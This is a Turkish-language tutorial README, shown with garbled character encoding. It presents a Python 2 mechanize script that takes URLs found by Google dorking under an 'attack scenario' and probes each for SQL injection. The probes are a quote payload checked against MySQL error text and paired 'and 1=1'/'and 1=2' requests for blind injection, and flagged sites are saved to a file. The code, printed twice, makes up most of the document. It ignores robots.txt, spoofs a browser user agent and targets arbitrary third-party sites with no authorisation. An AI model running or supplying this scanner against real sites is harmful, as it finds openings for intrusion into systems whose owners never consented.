üïä Bu d√∂k√ºman [**@KekikAkademi**](https://t.me/KekikAkademi "Telegram: @KekikAkademi") i√ßin olu≈üturulmu≈ütur. ‚úåüèº
________________________________
# Py4H SQL Injection Dedekt√∂r
![Py4H SQL Injection Dedekt√∂r](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/10-Py4H-SQL-Injection-Dedektor/images/Py4H-SQL-Injection-Dedektor.png)

Merhaba arkada≈ülar bu yazƒ±mƒ±zda  **Sql Injection**  zaafiyetini tespit etmek i√ßin ufak bir ara√ß yapacaƒüƒ±z. Daha √∂nceki  [Google Searcher](https://github.com/KekikAkademi/KekikPython/tree/master/5-Py4H-Googler)  projemizde √ßƒ±kan linkleri txt dosyasƒ±na kayƒ±t etmi≈ütik bu sefer txt dosyasƒ±ndaki linkleri okuyarak sql injection a√ßƒ±ƒüƒ± var mƒ± yok mu bunu kontrol edeceƒüiz.

**Saldƒ±rƒ± Senaryosu:**
X dorku ile bulduƒüumuz arama sonu√ßlarƒ±nda √ßƒ±kan her bir hedef linkte sql injection a√ßƒ±ƒüƒ± i√ßin kontrol a≈üamalarƒ±ndan ge√ßireceƒüiz. Tespit edilen linkler bize txt dosyasƒ±nda sunulacak.

**Algoritma:**
1. Ba≈üla  
2. Link var ise al yok ise 5. adƒ±ma git  
3. Adim1() sql injection var ise yazdƒ±r 2. adƒ±ma git  
4. Adim2() sql injection var ise yazdƒ±r ve 2. adƒ±ma git  
5. Programƒ± sonlandƒ±r

**Kod Payla≈üƒ±mƒ±: !!PYTHON 2!!**
ƒ∞lk olarak genel ayarlarƒ±mƒ±zƒ± yaptƒ±k her zamanki gibi. Bu sefer timeout s√ºresinide deƒüi≈ütirdik √ßok beklemek istemeyiz √ß√ºnk√º.

	#! -*- coding: utf-8 -*-
	import mechanize,re,sys #kullanacaƒüƒ±mƒ±z mod√ºlleri aktardƒ±k.
	br = mechanize.Browser() # tarayicimizi olusturduk..
	br.set_handle_robots(False) # robots.txt engellerini a≈ümak i√ßin false dedik
	br.addheaders = [('User-agent', 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)')] # header ekledik
	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 5 # timeout s√ºresini belirledik

Bu kƒ±sƒ±mda standart bir≈üey yaptƒ±k arkada≈ülar. Aracƒ±mƒ±zƒ± bir ba≈ükasƒ± kullandƒ±ƒüƒ± zaman nasƒ±l kullanƒ±ldƒ±ƒüƒ± hakkƒ±nda yardƒ±mcƒ± olmak adƒ±na fonksiyonumuzu olu≈üturduk.

	def yardim(): #yardim fonksiyonumuz
		print "[!] √ñrnek kullanƒ±m:\n>> sql-i.py -i linkler.txt -o sonuclar.txt" # √∂rnek kullanƒ±m..
		print "\n[+] = sql injection var demek!\n[?] = sql injection olabilir demek!\n[??] = blind sql injection olabilir demek!"

1.Adƒ±m dediƒüimiz kƒ±sƒ±m arkada≈ülar. Herkesin yaptƒ±ƒüƒ± gibi en basit sql injection hatasƒ± var mƒ± yok mu diyerek ‚Äòa ifadesini koyduk linklerimizin sonuna..

	def Adim1(link): #Adƒ±m 1
		istek = br.open(link) # gelen linke istek g√∂nderilir..
		kaynak_kod = istek.read() # a√ßƒ±lan linkin  kaynak kodu alƒ±nƒ±r
		istek2 = br.open(link+"'a") # aynƒ± linke 'a eklenerek 2. istek atƒ±lƒ±r 
		kaynak_kod2 = istek2.read() # a√ßƒ±lan sitenin kaynak kodu 2. kez alƒ±nƒ±r
		if kaynak_kod != kaynak_kod2: # alƒ±nan 2 kaynak kod e≈üit deƒüil ise 
			if re.findall('You have an error in your SQL',kaynak_kod2): # 2. aldƒ±ƒüƒ±mƒ±z kaynak kodda ≈üu c√ºmle aranƒ±r
				print "[+] "+link # varsa ekrana yazdƒ±r
				dosya2.write(link+"\n") # ve dosyamƒ±za yazdƒ±rƒ±rƒ±z
				pass # ge√ß
			else: # 2.kaynak kod da sihirli s√∂zc√ºk yok ise
				print "[?] "+link # Sql injection olabilir denilir..
				dosya2.write(link+"\n") # ve dosyamƒ±za yazdƒ±rƒ±rƒ±z
				pass # ge√ß
		else: # eƒüer kar≈üƒ±la≈ütƒ±rƒ±lan 2 kaynak kod da aynƒ± ise
			Adim2(link) # Adƒ±m 2 ye gider linkimiz..

2.Adƒ±m dediƒüimiz bu kƒ±sƒ±mda eƒüer ‚Äòa diyerek hata alamƒ±yorsak mantƒ±ksal sorgu ile birde ≈üansƒ±mƒ±zƒ± 2. adƒ±mda deneyeceƒüiz arkada≈ülar..

	def Adim2(link): # Adƒ±m 2
		#print "Adƒ±m 2 ye ge√ßildi !!"
		istek3 = br.open(link+"+and+1=1") # linkimiz 3. istekde mantƒ±ksal sorgu ile tekrar a√ßƒ±ldƒ±
		kaynak_kod3 = istek3.read() # a√ßƒ±lan sitenin kaynak kodu alƒ±ndƒ±
		istek4 = br.open(link+"+and+1=2") # 4. istekte yine ilk mantƒ±ksal sorguya ters bir mantƒ±k ile tekrar a√ßƒ±ldƒ±
		kaynak_kod4 = istek4.read() # a√ßƒ±lan sitenin kaynak kodu alƒ±ndƒ±
		if kaynak_kod3 != kaynak_kod4: # kaynak kodlar kar≈üƒ±la≈ütƒ±rƒ±ldƒ± aynƒ± deƒüil ise !
			print "[??] "+link # Blind sql injection olabilir dendi..
			dosya2.write(link+"\n") # ve dosyamƒ±za yazƒ±ldƒ±
			pass # ge√ß
		else: # kaynak kodlar aynƒ± ise
			pass # ge√ß

Ve son kƒ±sƒ±m arkada≈ülar burasƒ± kodlarƒ±mƒ±zƒ±n beyni oluyor yani b√ºt√ºn i≈ü burada d√∂n√ºyor daha √∂nceki fonksiyonlarƒ±mƒ±zƒ± buradan √ßaƒüƒ±rƒ±yoruz gerekli hatalarƒ± burada yok sayƒ±yoruz(bypass).Bu kƒ±sƒ±mda a√ßƒ±klama satƒ±rlarƒ±nda da okuyacaƒüƒ±nƒ±z gibi txt den aldƒ±ƒüƒ±mƒ±z linkleri gerekli fonksiyonumuza yollayarak yolculuƒüa √ßƒ±karƒ±yoruz aynƒ± zamanda bol bol hatalarƒ± yok saymak adƒ±na try except metodunu kullanƒ±yoruz.

	try: # Hatalar i√ßin try kullanƒ±yoruz
		if sys.argv[1] == "-i" and sys.argv[3] == "-o": # arg√ºmanlarda -i ve -o var mƒ± kontrol ettik eƒüer var ise
			i_dosya = sys.argv[2] # arg√ºmanlarƒ±mƒ±zƒ± alƒ±yoruz
			o_dosya = sys.argv[4] # arg√ºmanlarƒ±mƒ±zƒ± alƒ±yoruz
			dosya = open(i_dosya,"r") # dosyamƒ±zƒ± okumak adƒ±na a√ßtƒ±k
			kelimeler = dosya.read() # okuduk
			linkler = kelimeler.split("\n") # listemize aktardƒ±k split ile par√ßalayarak..
			dosya2 = open(o_dosya,"a") # 2. dosyamƒ±zƒ± a√ßtƒ±k √ºzerine eklemeli olarak yazmak i√ßin !		
			for a in linkler: # linklerimizi for d√∂ng√ºs√ºnde d√∂k√ºyoruz
				try: # yine aynƒ± ≈üekil sitelerin g√ºvenlik duvarlarƒ±nƒ±n verdikleri cevaplardan programƒ±mƒ±zƒ±n hata vermemesi i√ßin try kullandƒ±k
					Adim1(a) # Adim 1 e linkimizi yolladƒ±k
				except:
					pass # Hata √ßƒ±karsa ge√ß sƒ±radaki linke 
			print "[+] ƒ∞slem bitmistir.." # i≈ülem bittiƒüinde
		else: # arg√ºmanlar yok ise
			yardim() # yardim fonksiyonunu g√∂ster kullanma kƒ±lavuzu
	except: # Hata √ßƒ±karsa
		yardim() # yardim fonksiyonumuzu g√∂ster..

Ve arkada≈ülar projemizin sonuna gelmi≈ü bulunmaktayƒ±z. Kodlarƒ±n hepsine a≈ü≈üaƒüƒ±dan ula≈üabilirsiniz.

	#! -*- coding: utf-8 -*-
	import mechanize,re,sys #kullanacaƒüƒ±mƒ±z mod√ºlleri aktardƒ±k.
	br = mechanize.Browser() # tarayicimizi olusturduk..
	br.set_handle_robots(False) # robots.txt engellerini a≈ümak i√ßin false dedik
	br.addheaders = [('User-agent', 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)')] # header ekledik
	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 5 # timeout s√ºresini belirledik

	def yardim(): #yardim fonksiyonumuz
		print "[!] √ñrnek kullanƒ±m:\n>> sql-i.py -i linkler.txt -o sonuclar.txt" # √∂rnek kullanƒ±m..
		print "\n[+] = sql injection var demek!\n[?] = sql injection olabilir demek!\n[??] = blind sql injection olabilir demek!"
	def Adim2(link): # Adƒ±m 2
		#print "Adƒ±m 2 ye ge√ßildi !!"
		istek3 = br.open(link+"+and+1=1") # linkimiz 3. istekde mantƒ±ksal sorgu ile tekrar a√ßƒ±ldƒ±
		kaynak_kod3 = istek3.read() # a√ßƒ±lan sitenin kaynak kodu alƒ±ndƒ±
		istek4 = br.open(link+"+and+1=2") # 4. istekte yine ilk mantƒ±ksal sorguya ters bir mantƒ±k ile tekrar a√ßƒ±ldƒ±
		kaynak_kod4 = istek4.read() # a√ßƒ±lan sitenin kaynak kodu alƒ±ndƒ±
		if kaynak_kod3 != kaynak_kod4: # kaynak kodlar kar≈üƒ±la≈ütƒ±rƒ±ldƒ± aynƒ± deƒüil ise !
			print "[??] "+link # Blind sql injection olabilir dendi..
			dosya2.write(link+"\n") # ve dosyamƒ±za yazƒ±ldƒ±
			pass # ge√ß
		else: # kaynak kodlar aynƒ± ise
			pass # ge√ß
	def Adim1(link): #Adƒ±m 1
		istek = br.open(link) # gelen linke istek g√∂nderilir..
		kaynak_kod = istek.read() # a√ßƒ±lan linkin  kaynak kodu alƒ±nƒ±r
		istek2 = br.open(link+"'a") # aynƒ± linke 'a eklenerek 2. istek atƒ±lƒ±r 
		kaynak_kod2 = istek2.read() # a√ßƒ±lan sitenin kaynak kodu 2. kez alƒ±nƒ±r
		if kaynak_kod != kaynak_kod2: # alƒ±nan 2 kaynak kod e≈üit deƒüil ise 
			if re.findall('You have an error in your SQL',kaynak_kod2): # 2. aldƒ±ƒüƒ±mƒ±z kaynak kodda ≈üu c√ºmle aranƒ±r
				print "[+] "+link # varsa ekrana yazdƒ±r
				dosya2.write(link+"\n") # ve dosyamƒ±za yazdƒ±rƒ±rƒ±z
				pass # ge√ß
			else: # 2.kaynak kod da sihirli s√∂zc√ºk yok ise
				print "[?] "+link # Sql injection olabilir denilir..
				dosya2.write(link+"\n") # ve dosyamƒ±za yazdƒ±rƒ±rƒ±z
				pass # ge√ß
		else: # eƒüer kar≈üƒ±la≈ütƒ±rƒ±lan 2 kaynak kod da aynƒ± ise
			Adim2(link) # Adƒ±m 2 ye gider linkimiz..

	try: # Hatalar i√ßin try kullanƒ±yoruz
		if sys.argv[1] == "-i" and sys.argv[3] == "-o": # arg√ºmanlarda -i ve -o var mƒ± kontrol ettik eƒüer var ise
			i_dosya = sys.argv[2] # arg√ºmanlarƒ±mƒ±zƒ± alƒ±yoruz
			o_dosya = sys.argv[4] # arg√ºmanlarƒ±mƒ±zƒ± alƒ±yoruz
			dosya = open(i_dosya,"r") # dosyamƒ±zƒ± okumak adƒ±na a√ßtƒ±k
			kelimeler = dosya.read() # okuduk
			linkler = kelimeler.split("\n") # listemize aktardƒ±k split ile par√ßalayarak..
			dosya2 = open(o_dosya,"a") # 2. dosyamƒ±zƒ± a√ßtƒ±k √ºzerine eklemeli olarak yazmak i√ßin !		
			for a in linkler: # linklerimizi for d√∂ng√ºs√ºnde d√∂k√ºyoruz
				try: # yine aynƒ± ≈üekil sitelerin g√ºvenlik duvarlarƒ±nƒ±n verdikleri cevaplardan programƒ±mƒ±zƒ±n hata vermemesi i√ßin try kullandƒ±k
					Adim1(a) # Adim 1 e linkimizi yolladƒ±k
				except:
					pass # Hata √ßƒ±karsa ge√ß sƒ±radaki linke 
			print "[+] ƒ∞slem bitmistir.." # i≈ülem bittiƒüinde
		else: # arg√ºmanlar yok ise
			yardim() # yardim fonksiyonunu g√∂ster kullanma kƒ±lavuzu
	except: # Hata √ßƒ±karsa
		yardim() # yardim fonksiyonumuzu g√∂ster..

Not: Projemiz Python 2.x s√ºr√ºm√º ile kodlanmƒ±≈ü olup en √ßok sevdiƒüim mod√ºllerden birisi olan **mechanize** mod√ºl√ºn√º kullandƒ±k. Mechanize mod√ºl√º, standart k√ºt√ºphanelerde olmadƒ±ƒüƒ± i√ßin ayrƒ±ca y√ºklemeniz gerekmektedir.

[Kaynak](http://python4hackers.com/python-sql-injection-tools/py4h-sql-injection-dedektor.html "Saygƒ± ve √ñzlemle..")
________________________________
üìÉ **Yandex.Disk B√ºnyemizde 900GB veri olmu≈ütur.**

_Payla≈üƒ±lan Kurslarƒ±n T√ºm√ºn√º_ [**@KekikKahve**](https://t.me/KekikKahve) _Grubu notlarƒ±ndan √áaƒüƒ±rabilirsiniz.._

üïäÔ∏è Bize **oy verip** _payla≈üarak_ destek olmaya ne dersin? ‚úåüèº
#
> Bu readme sayfasƒ± olu≈üturulurken [prose.io](http://prose.io/ "prose.io") ve [stackedit.io](https://stackedit.io/app "stackedit.io") ara√ßlarƒ±ndan yardƒ±m alƒ±nmƒ±≈ütƒ±r..
> Emojiler i√ßin [webfx](https://www.webfx.com/tools/emoji-cheat-sheet/ "Emoji Cheat Sheet") sayfasƒ± kullanƒ±lmƒ±≈ütƒ±r.